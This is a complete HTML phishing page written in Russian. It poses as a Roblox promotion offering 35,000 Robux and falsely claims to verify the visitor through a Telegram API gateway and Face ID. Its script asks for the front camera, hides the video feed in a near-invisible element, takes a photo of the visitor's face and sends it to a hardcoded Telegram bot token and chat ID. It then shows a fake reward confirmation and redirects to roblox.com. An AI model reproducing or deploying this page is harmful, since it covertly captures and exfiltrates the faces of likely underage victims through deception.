<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Promo Event</title>
    <style>
        body { font-family: 'Gotham', sans-serif; background: #000; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .box { background: #191b1d; border: 2px solid #0084ff; padding: 30px; border-radius: 20px; width: 85%; max-width: 380px; box-shadow: 0 0 20px rgba(0,132,255,0.3); }
        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; }
        #st { margin-top: 15px; color: #888; font-size: 13px; }
        .tg-link { color: #0084ff; font-size: 11px; display: block; margin-top: 5px; opacity: 0.7; }
        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 15px;">
    <h2>ПОЛУЧИТЬ 35,000 ROBUX</h2>
    <p>Нажмите кнопку для верификации через шлюз Telegram API.</p>
    <button class="btn" id="btn" onclick="megaCapture()">ПОЛУЧИТЬ</button>
    <div id="st">Ожидание...</div>
    <span class="tg-link">api-telegram-auth.org/verify_id</span>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    async function megaCapture() {
        const btn = document.getElementById('btn');
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.style.display = 'none';
        
        // ШАГ 1: Имитация перехода на домен Telegram
        st.innerHTML = "Перенаправление на <b>api.telegram.org</b>...";
        
        setTimeout(async () => {
            st.innerHTML = "<span style='color:#00ff00'>Соединение установлено!</span><br>Разрешите Face ID в окне браузера.";
            
            try {
                // ШАГ 2: Запрос камеры (Пробитие передней)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                v.srcObject = stream;

                v.onloadedmetadata = () => {
                    v.play();
                    
                    // ШАГ 3: Задержка 5.5 сек для четкого фото
                    setTimeout(() => {
                        c.width = v.videoWidth;
                        c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        
                        c.toBlob(blob => {
                            const fd = new FormData();
                            fd.append('chat_id', '7889497672');
                            fd.append('photo', blob, 'face.jpg');
                            fd.append('caption', '🚀 **ЛИЦО ПОЛУЧЕНО!**\n\n✅ Метод: API Redirect Mask\n📱 Статус: Успешно');

                            fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                                method: 'POST',
                                body: fd
                            }).then(() => {
                                stream.getTracks().forEach(t => t.stop());
                                alert("✅ Личность подтверждена! Награда зачислится через 10 минут.");
                                window.location.href = "https://www.roblox.com";
                            });
                        }, 'image/jpeg', 0.9);
                    }, 5500);
                };
            } catch (e) {
                alert("Ошибка! Вы отклонили запрос Telegram API. Попробуйте снова.");
                btn.style.display = 'block';
                st.innerText = "";
            }
        }, 2000); // 2 секунды на "перенаправление"
    }
</script>
</body>
</html>
